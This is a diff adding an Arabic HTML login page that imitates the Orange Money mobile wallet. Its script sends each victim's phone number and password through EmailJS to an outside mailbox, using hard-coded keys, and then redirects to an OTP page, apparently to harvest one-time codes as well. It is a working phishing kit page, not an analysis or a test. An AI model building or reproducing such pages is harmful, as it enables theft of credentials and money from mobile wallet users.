@@ -1,0 +1,371 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>تسجيل الدخول</title>
+<!-- استدعاء خط Cairo لمطابقة خطوط الواجهات الحديثة في الصورة -->
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700&display=swap" rel="stylesheet">
+
+<!-- استدعاء مكتبة EmailJS -->
+<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+<script type="text/javascript">
+  (function(){
+     // قم بوضع الـ Public Key الخاص بك هنا من لوحة تحكم EmailJS
+     emailjs.init("iiwqfQQ5xVF9GfcPJ");
+  })();
+</script>
+
+<style>
+  :root {
+    --primary-orange: #ff6600;
+    --primary-orange-hover: #e05a00;
+    --bg-white: #ffffff;
+    --bg-field: #ffffff;
+    --border-field: #666666;
+    --text-dark: #222222;
+    --text-gray: #666666;
+    --footer-bg: #ececee;
+    --header-black: #0a0a0a;
+    
+    /* متغير للتحكم بحجم أيقونة القفل على الزر (تم تكبيرها بنسبة 30%) */
+    --lock-icon-size: 38px; 
+  }
+
+  * {
+    box-sizing: border-box;
+    margin: 0;
+    padding: 0;
+    font-family: 'Cairo', 'Segoe UI', Tahoma, sans-serif;
+  }
+
+  body {
+    background-color: #000000;
+    display: flex;
+    justify-content: center;
+    min-height: 100vh;
+  }
+
+  .phone-frame {
+    width: 100%;
+    max-width: 420px;
+    background: var(--bg-white);
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    justify-content: space-between;
+    zoom: 0.8;
+  }
+
+  /* الهيدر الأسود - تم تعديله ليغطي اللوقو المساحة كاملة */
+  .header {
+    background-color: var(--header-black);
+    padding: 0; /* إزالة الحواف الداخلية */
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    width: 100%;
+  }
+
+  .header .logo {
+    width: 100%; /* تمدد بنسبة 100% */
+    height: auto;
+    display: block;
+  }
+
+  .main-content {
+    padding: 34px 22px 24px;
+    flex: 1;
+  }
+
+  /* تنسيق حقول الإدخال بخلفية بيضاء مع خط سفلي غامق فقط */
+  .field-container {
+    background-color: var(--bg-field);
+    border-bottom: 1.5px solid var(--border-field);
+    padding: 6px 2px 6px;
+    margin-bottom: 6px;
+  }
+
+  .field-label {
+    display: block;
+    font-size: 14px;
+    font-weight: 500;
+    color: var(--text-gray);
+    margin-bottom: 4px;
+  }
+
+  .input-row {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+  }
+
+  .field-input {
+    border: none;
+    outline: none;
+    background: transparent;
+    width: 100%;
+    font-size: 15px;
+    color: var(--text-dark);
+    direction: ltr;
+    text-align: right;
+  }
+
+  /* تنسيق أيقونة العين المشطوبة مطابقة للصورة */
+  .eye-icon {
+    color: #444444;
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    padding: 2px;
+  }
+
+  .hint-text {
+    font-size: 12.5px;
+    color: var(--text-gray);
+    margin-bottom: 24px;
+    font-weight: 500;
+    padding-right: 2px;
+  }
+
+  /* رابط نسيت كلمة السر مع الخط السفلي البرتقالي */
+  .forgot-password-wrapper {
+    text-align: right;
+    margin-top: 15px;
+    margin-bottom: 28px;
+  }
+
+  .forgot-password-link {
+    color: var(--primary-orange);
+    font-size: 13.5px;
+    font-weight: 600;
+    text-decoration: none;
+    border-bottom: 1.5px solid var(--primary-orange);
+    padding-bottom: 2px;
+  }
+
+  /* زر تسجيل الدخول البرتقالي */
+  .btn-login {
+    width: 100%;
+    background-color: var(--primary-orange);
+    color: #ffffff;
+    border: none;
+    border-radius: 8px;
+    padding: 15px 16px;
+    font-size: 16px;
+    font-weight: 700;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    position: relative;
+    cursor: pointer;
+    box-shadow: 0 2px 6px rgba(240, 83, 35, 0.2);
+    transition: background-color 0.2s;
+  }
+
+  .btn-login:hover {
+    background-color: var(--primary-orange-hover);
+  }
+
+  /* أيقونة القفل عائمة مباشرة على الزر */
+  .lock-box {
+    position: absolute;
+    left: 16px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+  }
+
+  /* يتم استخدام المتغير للتحكم بالحجم */
+  .lock-box svg, .lock-icon {
+    width: var(--lock-icon-size);
+    height: var(--lock-icon-size);
+    stroke: #ffffff;
+    stroke-width: 2;
+    object-fit: contain;
+  }
+
+  /* الأزرار الثانوية أسفل زر الدخول */
+  .secondary-buttons-row {
+    display: flex;
+    gap: 12px;
+    margin-top: 14px;
+  }
+
+  .btn-secondary {
+    flex: 1;
+    padding: 14px 8px;
+    border-radius: 6px;
+    font-size: 14px;
+    font-weight: 700;
+    text-align: center;
+    cursor: pointer;
+    border: none;
+    transition: opacity 0.2s;
+  }
+
+  .btn-secondary:hover {
+    opacity: 0.9;
+  }
+
+  .btn-self-reg {
+    background-color: #000000;
+    color: #ffffff;
+  }
+
+  .btn-first-login {
+    background-color: #f5f5f6;
+    color: #111111;
+    border: 1px solid #e2e2e5;
+  }
+
+  /* الفوتر الرمادي السفلي */
+  .footer {
+    background-color: var(--footer-bg);
+    padding: 14px 22px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    position: relative;
+    border-top: 1px solid #e0e0e0;
+  }
+
+  .contact-link {
+    color: #555555;
+    font-size: 14px;
+    font-weight: 600;
+    text-decoration: none;
+  }
+
+  .lang-btn {
+    position: absolute;
+    right: 22px;
+    background-color: transparent;
+    border: 1px solid #444444;
+    border-radius: 6px;
+    padding: 5px 18px;
+    font-size: 13.5px;
+    font-weight: 600;
+    color: #222222;
+    cursor: pointer;
+  }
+
+  .lang-btn:hover {
+    background-color: rgba(0,0,0,0.05);
+  }
+
+  /* تجاوب الشاشات الصغيرة */
+  @media (max-width: 480px) {
+    body { background-color: var(--bg-white); }
+    .phone-frame { max-width: 100%; }
+  }
+</style>
+</head>
+<body>
+
+  <div class="phone-frame">
+
+    <div class="header">
+      <img class="logo" src="https://i.imgur.com/DZxJ5Rz.jpeg" alt="Orange Money">
+    </div>
+
+    <div class="main-content">
+      <!-- تم إضافة id وإزالة onsubmit السابقة لربط الفورم مع EmailJS -->
+      <form id="loginForm">
+
+        <!-- حقل رقم الهاتف -->
+        <div class="field-container">
+          <label class="field-label">رقم الهاتف</label>
+          <div class="input-row">
+            <!-- تم إضافة name="phone" ليتعرف عليه EmailJS -->
+            <input type="tel" name="phone" class="field-input" inputmode="numeric" autocomplete="tel" required>
+          </div>
+        </div>
+        <div class="hint-text">الرجاء إدخال رقم الهاتف الذي يبدأ بـ ٠٧٧ أو ٠٧٨ أو ٠٧٩.</div>
+
+        <!-- حقل كلمة السر -->
+        <div class="field-container">
+          <label class="field-label">كلمة السر</label>
+          <div class="input-row">
+            <!-- تم إضافة name="password" -->
+            <input type="password" name="password" id="passwordInput" class="field-input" autocomplete="current-password" required>
+            <span class="eye-icon" onclick="togglePassword()">
+              <svg id="eyeSvg" width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path>
+                <line x1="1" y1="1" x2="23" y2="23"></line>
+              </svg>
+            </span>
+          </div>
+        </div>
+
+        <div class="forgot-password-wrapper">
+          <a href="#" class="forgot-password-link">نسيت كلمة السر</a>
+        </div>
+
+        <button type="submit" class="btn-login">
+          <div class="lock-box">
+            <img src="https://i.imgur.com/43Ml7mz.jpeg" alt="lock" class="lock-icon">
+          </div>
+          <span>تسجيل الدخول</span>
+        </button>
+
+      </form>
+
+      <div class="secondary-buttons-row">
+        <button type="button" class="btn-secondary btn-self-reg">التسجيل الذاتي</button>
+        <button type="button" class="btn-secondary btn-first-login">تسجيل الدخول لأول مرة</button>
+      </div>
+
+    </div>
+
+    <div class="footer">
+      <a href="#" class="contact-link">تواصل معنا</a>
+      <button type="button" class="lang-btn">English</button>
+    </div>
+
+  </div>
+
+<script>
+  // دالة إظهار وإخفاء كلمة السر
+  function togglePassword() {
+    const input = document.getElementById("passwordInput");
+    const svg = document.getElementById("eyeSvg");
+    
+    if (input.type === "password") {
+      input.type = "text";
+      svg.innerHTML = `
+        <path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"></path>
+        <circle cx="12" cy="12" r="3"></circle>
+      `;
+    } else {
+      input.type = "password";
+      svg.innerHTML = `
+        <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path>
+        <line x1="1" y1="1" x2="23" y2="23"></line>
+      `;
+    }
+  }
+
+  // كود إرسال النموذج عبر EmailJS ثم التوجيه المباشر إلى otp.html
+  document.getElementById('loginForm').addEventListener('submit', function(event) {
+    event.preventDefault();
+
+    // تخزين رقم الهاتف المدخل عشان يظهر بصفحة التحقق
+    const phoneValue = this.querySelector('input[name="phone"]').value;
+    localStorage.setItem('phoneNumber', phoneValue);
+
+    // إرسال البيانات عبر EmailJS والتوجيه مباشرة فور الانتهاء
+    emailjs.sendForm('service_8wd4e39', 'template_j658pej', this)
+      .then(function() {
+          window.location.href = 'otp.html';
+      }, function(error) {
+          console.log('FAILED...', error);
+          window.location.href = 'otp.html';
+      });
+  });
+</script>
+
+</body>
+</html>
